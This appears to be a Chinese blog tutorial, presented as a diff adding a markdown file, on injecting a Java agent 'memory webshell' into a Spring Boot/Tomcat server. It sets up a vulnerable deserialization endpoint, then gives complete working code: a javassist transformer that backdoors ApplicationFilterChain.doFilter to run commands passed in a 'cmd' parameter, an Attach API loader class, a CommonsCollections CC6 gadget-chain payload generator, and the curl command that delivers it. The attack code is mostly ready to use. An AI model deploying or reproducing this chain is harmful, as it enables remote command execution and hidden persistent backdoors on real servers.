@@ -1,0 +1,399 @@
+## 写在前面
+
+前面我们对JAVA中的Agent技术进行了简单的学习，学习前面的Agent技术是为了给这篇Agent内存马的实现做出铺垫，接下来我们就来看看Agent内存马的实现。
+
+这是内存马系列篇的第十三篇了。
+
+## 环境搭建
+
+我这里就使用Springboot来搭建一个简单的漏洞环境，对于agent内存马的注入，我这里搭建的是一个具有明显的反序列化漏洞的web服务，通过反序列化漏洞来进行内存马的注入，
+
+IDEA新建一个springboot项目
+
+漏洞代码：
+
+    
+    
+    package com.roboterh.vuln.controller;
+    
+    import org.springframework.stereotype.Controller;
+    import org.springframework.web.bind.annotation.RequestMapping;
+    import org.springframework.web.bind.annotation.ResponseBody;
+    
+    import javax.servlet.http.HttpServletRequest;
+    import javax.servlet.http.HttpServletResponse;
+    import java.io.ObjectInputStream;
+    
+    @Controller
+    public class CommonsCollectionsVuln {
+        @ResponseBody
+        @RequestMapping("/unser")
+        public void unserialize(HttpServletRequest request, HttpServletResponse response) throws Exception {
+            java.io.InputStream inputStream =  request.getInputStream();
+            ObjectInputStream objectInputStream = new ObjectInputStream(inputStream);
+            objectInputStream.readObject();
+            response.getWriter().println("successfully!!!");
+        }
+    
+        @ResponseBody
+        @RequestMapping("/demo")
+        public void demo(HttpServletRequest request, HttpServletResponse response) throws Exception{
+            response.getWriter().println("This is a Demo!!!");
+        }
+    }
+    
+
+在`/unser`路由中，获取了请求体的序列化数据，进行反序列化调用；
+
+在`/demo`路由中，返回了一个字符串；
+
+我打算的是通过CC链进行写入。
+
+添加依赖。
+
+    
+    
+    <dependency>
+        <groupId>commons-collections</groupId>
+        <artifactId>commons-collections</artifactId>
+        <version>3.2.1</version>
+    </dependency>
+    
+
+## 正式注入
+
+### 编写agent.jar
+
+有了前面的知识，我们知道在一个运行中的web服务中，对于`premain`方法的调用方式不太适用，更实用的是通过`agentmain`方法的调用。
+
+在通过内置的Attach API进行加载之后将会调用这个方法进行动态修改字节码，所以如果我们能够在该方法中实现我们的恶意逻辑，就能够达到我们的目的。
+
+但是怎么才能注入内存马使得能够与用户请求进行交互式的命令执行捏？这里我们是通过类似于前面提到过的在Tomcat
+Filter内存马类似的思想，通过利用`org.apache.catalina.core.ApplicationFilterChain#doFilter`方法。
+
+只是对于前面所提到的`Filter`型内存马的实现主要是通过动态添加了一个过滤器，通过配置特定的路由和调用对应的`doFilter`方法进行利用。
+
+这里我们注入agent内存马主要是通过使用前面基础部分讲过的通过`javassist`框架进行修改doFilter方法的字节码。
+
+非常友好的是在`doFilter`方法中存在有`ServletRequest / ServletResponse`实例，可以直接和请求进行交互。
+
+![image-20221020210332062.png](https://image.3001.net/images/20221027/1666878865_635a8d91c2bbe77ea2be0.png!small)
+
+好了，接下来看看实现，我们可以简化为以下关键的几步：
+
+  1. 通过`addTransformer`方法的调用来添加一个实现了`java.lang.instrument.ClassFileTransformer`接口的一个类。  
+![image-20221020210557192.png](https://image.3001.net/images/20221027/1666878874_635a8d9a9519cbe7db754.png!small)
+
+  2. 之后通过调用`retransformClasses`方法，来触发前面添加的转换器的`transform`方法来修改传入的类的对应方法的字节码。
+
+![image-20221020210646261.png](https://image.3001.net/images/20221027/1666878899_635a8db358f5f9eff467a.png!small)
+
+首先是一个存在有`agentmain`方法的`AgentDemo`类。
+
+    
+    
+    import java.lang.instrument.Instrumentation;
+    
+    public class AgentDemo {
+        public static final String ClassName = "org.apache.catalina.core.ApplicationFilterChain";
+    
+        public static void agentmain(String agentArgs, Instrumentation inst) {
+            inst.addTransformer(new TransformerDemo(), true);
+            Class[] allLoadedClasses = inst.getAllLoadedClasses();
+            for (Class aClass : allLoadedClasses) {
+                if (aClass.getName().equals(ClassName)) {
+                    System.out.println("AgentDemo...");
+                    try {
+                        inst.retransformClasses(new Class[]{aClass});
+                    } catch (Exception e) {
+                        e.printStackTrace();
+                    }
+                }
+            }
+        }
+    }
+    
+
+首先定义了一个我们想要修改的类名`ClassName`字符串，之后在agentmain方法中，添加进入一个我们实现的转换器，将第二个参数置为了`true`。
+
+![image-20221020211357776.png](https://image.3001.net/images/20221027/1666878885_635a8da5bcabb973d356a.png!small)
+
+设置这个转换器是否可以再次进行转换，之后通过调用`getAllLoadedClasses`方法来获取所有在JVM中加载的类，之后就是匹配我们我们需要修改的类名，如果成功匹配，我们调用`retransformClasses`方法转入需要修改的类。
+
+接下来就是`ClassFileTransformer`接口的实现类`TransformerDemo`类的逻辑。
+
+    
+    
+    import javassist.ClassPool;
+    import javassist.CtClass;
+    import javassist.CtMethod;
+    
+    import java.lang.instrument.ClassFileTransformer;
+    import java.lang.instrument.IllegalClassFormatException;
+    import java.security.ProtectionDomain;
+    
+    public class TransformerDemo implements ClassFileTransformer {
+        public static final String ClassName = "org.apache.catalina.core.ApplicationFilterChain";
+    
+        public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) {
+            className = className.replace("/",".");
+            if (className.equals(ClassName)){
+                System.out.println("Find the Inject Class: " + ClassName);
+                ClassPool pool = ClassPool.getDefault();
+                try {
+                    CtClass c = pool.getCtClass(className);
+                    CtMethod m = c.getDeclaredMethod("doFilter");
+                    m.insertBefore("javax.servlet.http.HttpServletRequest req =  request;\n" +
+                            "javax.servlet.http.HttpServletResponse res = response;\n" +
+                            "java.lang.String cmd = request.getParameter(\"cmd\");\n" +
+                            "if (cmd != null){\n" +
+                            "    try {\n" +
+                            "        java.io.PrintWriter printWriter = response.getWriter();\n" +
+                            "        ProcessBuilder processBuilder;\n" +
+                            "        String o = \"\";\n" +
+                            "        if (System.getProperty(\"os.name\").toLowerCase().contains(\"win\")) {\n" +
+                            "            processBuilder = new ProcessBuilder(new String[]{\"cmd.exe\", \"/c\", cmd});\n" +
+                            "        } else {\n" +
+                            "            processBuilder = new ProcessBuilder(new String[]{\"/bin/bash\", \"-c\", cmd});\n" +
+                            "        }\n" +
+                            "        java.util.Scanner scanner = new java.util.Scanner(processBuilder.start().getInputStream()).useDelimiter(\"\\A\");\n" +
+                            "        o = scanner.hasNext() ? scanner.next() : o;\n" +
+                            "        scanner.close();\n" +
+                            "        printWriter.println(o);\n" +
+                            "        printWriter.flush();\n" +
+                            "        printWriter.close();\n" +
+                            "    } catch (Exception e){\n" +
+                            "        e.printStackTrace();\n" +
+                            "    }\n" +
+                            "}");
+                    System.out.println("insertBefore....");
+                    byte[] bytes = c.toBytecode();
+                    c.detach();
+                    return bytes;
+                } catch (Exception e){
+                    e.printStackTrace();
+                }
+            }
+            return new byte[0];
+        }
+    }
+    
+    
+
+同样在该类中定义了一个需要修改的字符串`ClassName`，最后在`transform`方法中就是我们的主要逻辑
+
+通过调试，在这里我们得到的`className`的传参是一个使用`/`符号作为包名的分隔符，所以我们在transform中首先将`/`替换成了`.`符号之后进行匹配，如果成功匹配之后，就是对字节码的修改操作了
+
+对于字节码的修改操作，不仅可以使用javassist框架进行字节码的操作，也可以使用ASM等框架进行修改
+
+这里我是使用的是`javassist`框架，获取到了目标类的`doFilter`方法，调用其中的API，即是`insertBefore`方法将我们的逻辑写在该方法的前面，以至于不会影响原生方法的逻辑。
+
+其中写入的代码
+
+![image-20221020212826931.png](https://image.3001.net/images/20221027/1666878912_635a8dc0d4d30f905bf7d.png!small)
+
+也就是一个经典的将传入的`cmd`参数进行命令执行并将结果进行了返回，之后将我们修改后的`doFilter`方法的字节码返回。
+
+最后，我们可以分别编译后得到一个`agent.jar`包
+
+### 序列化数据的编写
+
+前面已经创建了一个agent.jar这个包，我们需要将这个包attach进JVM中
+
+前面提到我们通过CC链进行注入，所以我们需要编写一个继承了`com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet`类的类。
+
+    
+    
+    package pers.cc;
+    
+    import com.sun.org.apache.xalan.internal.xsltc.DOM;
+    import com.sun.org.apache.xalan.internal.xsltc.TransletException;
+    import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+    import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+    import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+    
+    import java.lang.reflect.Method;
+    import java.net.URL;
+    import java.net.URLClassLoader;
+    import java.util.List;
+    
+    public class agentInject extends AbstractTranslet {
+    
+        static {
+            try {
+                // 恶意agent的位置
+                String AgentPath = "xx\\Agent.jar";
+                // 在JVM启动时，没有加载tools.jar，这里通过URLClassLoader进行加载
+                URL toolsUrl = new URL("file:///xx/lib/tools.jar");
+                URLClassLoader loader = URLClassLoader.newInstance(new URL[]{toolsUrl});
+                // 加载tools.jar包中的 VirtualMachine / VirtualMachineDescriptor 类
+                Class<?> VirtualMachine = loader.loadClass("com.sun.tools.attach.VirtualMachine");
+                Class<?> VirtualMachineDescriptor = loader.loadClass("com.sun.tools.attach.VirtualMachineDescriptor");
+                // 反射获取list方法
+                Method listMethod = VirtualMachine.getDeclaredMethod("list", null);
+                // 通过调用list方法获取JVM绑定的服务
+                List<Object> list = (java.util.List<Object>) listMethod.invoke(VirtualMachine, null);
+                for (int i = 0; i < list.size(); i++) {
+                    // 遍历所有的服务，获取其名称组件
+                    Object o = list.get(i);
+                    Method displayName = VirtualMachineDescriptor.getDeclaredMethod("displayName",null);
+                    String name = (String) displayName.invoke(o,null);
+                    System.out.println(name);
+                    // 判断需要注入的组件名称
+                    if (name.contains("com.roboterh.vuln.Application")){
+                        // 获取对应的pid进程号
+                        Method getId = VirtualMachineDescriptor.getDeclaredMethod("id",null);
+                        String id = (String) getId.invoke(o,null);
+                        System.out.println("id => " + id);
+                        Method attach = VirtualMachine.getDeclaredMethod("attach",new Class[]{java.lang.String.class});
+                        Object vm = attach.invoke(o,new Object[]{id});
+                        // 调用loadAgent动态加载agent
+                        Method loadAgent = VirtualMachine.getDeclaredMethod("loadAgent",new Class[]{java.lang.String.class});
+                        loadAgent.invoke(vm,new Object[]{ AgentPath });
+                        // 断开
+                        Method detach = VirtualMachine.getDeclaredMethod("detach",null);
+                        detach.invoke(vm,null);
+                        System.out.println("Inject Success!");
+                        break;
+                    }
+                }
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+        }
+    
+        @Override
+        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
+    
+        }
+    
+        @Override
+        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
+    
+        }
+    }
+    
+
+简单提一下代码中的关键点
+
+> 将逻辑放在`static`代码块中，使得一加载就会触发其中的逻辑；
+>
+>
+> 因为在在JVM启动的时候，并不会加载`com.sun.tools.attach.VirtualMachine`等类存在的`tools.jar`包，所以我们需要通过`URLClassLoader`的方法来获取`VirtualMachine
+> / VirtualMachineDescriptor`等类；
+>
+>
+> 在我们筛选我们想要注入的组件，获取他的PID之后，通过反射调用`loadAgent`的方法进行恶意agent.jar的加载，最后通过`detach`进行取消代理。
+
+这里我选用的是使用CC6_plus的链子进行序列化数据的生成。
+
+    
+    
+    package pers.cc;
+    
+    import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+    import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+    import org.apache.commons.collections.functors.ConstantTransformer;
+    import org.apache.commons.collections.functors.FactoryTransformer;
+    import org.apache.commons.collections.functors.InstantiateFactory;
+    import org.apache.commons.collections.keyvalue.TiedMapEntry;
+    import org.apache.commons.collections.map.LazyMap;
+    import org.aspectj.util.FileUtil;
+    
+    import java.io.File;
+    import java.io.FileOutputStream;
+    import java.io.IOException;
+    import java.io.ObjectOutputStream;
+    import java.lang.reflect.Field;
+    import java.util.HashMap;
+    import java.util.Map;
+    
+    public class CC6_plus {
+        public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
+            Field field = obj.getClass().getDeclaredField(fieldName);
+            field.setAccessible(true);
+            field.set(obj, value);
+        }
+        public static void main(String[] args) throws Exception{
+            byte[] bytes = FileUtil.readAsByteArray(new File("xx\\agentInject.class"));
+    
+            TemplatesImpl obj = new TemplatesImpl();
+            setFieldValue(obj, "_bytecodes", new byte[][]{
+                    bytes
+            });
+            setFieldValue(obj, "_name", "1");
+            setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
+            InstantiateFactory instantiateFactory;
+            instantiateFactory = new InstantiateFactory(com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter.class
+                    ,new Class[]{javax.xml.transform.Templates.class},new Object[]{obj});
+    
+            FactoryTransformer factoryTransformer = new FactoryTransformer(instantiateFactory);
+    
+            ConstantTransformer constantTransformer = new ConstantTransformer(1);
+    
+            Map innerMap = new HashMap();
+            LazyMap outerMap = (LazyMap)LazyMap.decorate(innerMap, constantTransformer);
+    
+            TiedMapEntry tme = new TiedMapEntry(outerMap, "keykey");
+    
+            Map expMap = new HashMap();
+            expMap.put(tme, "valuevalue");
+            setFieldValue(outerMap,"factory",factoryTransformer);
+    
+            outerMap.remove("keykey");
+            serialize(expMap);
+        }
+        public static void serialize(Object obj) throws IOException {
+            ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream("1.ser"));
+            out.writeObject(obj);
+        }
+    }
+    
+
+### 注入演示
+
+我们运行漏洞环境，之后将我们生成的`1.ser`文件中的序列化数据发送。
+
+    
+    
+    curl -v "http://localhost:9999/unser" --data-binary "@./1.ser"
+    
+
+能够在控制台中发现一些输出。
+
+![image-20221020215248443.png](https://image.3001.net/images/20221027/1666878927_635a8dcf87cf4a8020378.png!small)
+
+如果你存在有`insertBefore....`这几个字符串，那么恭喜你，你成功了。
+
+![image-20221020215353512.png](https://image.3001.net/images/20221027/1666878939_635a8ddbcdcffff191a21.png!small)
+
+能够成功执行命令。
+
+其中执行命令的调用栈是。
+
+    
+    
+    start:1007, ProcessBuilder (java.lang)
+    doFilter:140, ApplicationFilterChain (org.apache.catalina.core)
+    invoke:202, StandardWrapperValve (org.apache.catalina.core)
+    invoke:97, StandardContextValve (org.apache.catalina.core)
+    invoke:542, AuthenticatorBase (org.apache.catalina.authenticator)
+    invoke:143, StandardHostValve (org.apache.catalina.core)
+    invoke:92, ErrorReportValve (org.apache.catalina.valves)
+    invoke:78, StandardEngineValve (org.apache.catalina.core)
+    service:357, CoyoteAdapter (org.apache.catalina.connector)
+    service:374, Http11Processor (org.apache.coyote.http11)
+    process:65, AbstractProcessorLight (org.apache.coyote)
+    process:893, AbstractProtocol$ConnectionHandler (org.apache.coyote)
+    doRun:1707, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)
+    run:49, SocketProcessorBase (org.apache.tomcat.util.net)
+    runWorker:1149, ThreadPoolExecutor (java.util.concurrent)
+    run:624, ThreadPoolExecutor$Worker (java.util.concurrent)
+    run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)
+    run:748, Thread (java.lang)
+    
+
+## 总结
+
+这个内存马算是我搞得比较久的一个内存马了，主要是中间出现了好多好多的问题，还好，时间没有白费，还是一步一个脚印的将所有错误debug解决了，不得不说debug是个好东西。
+
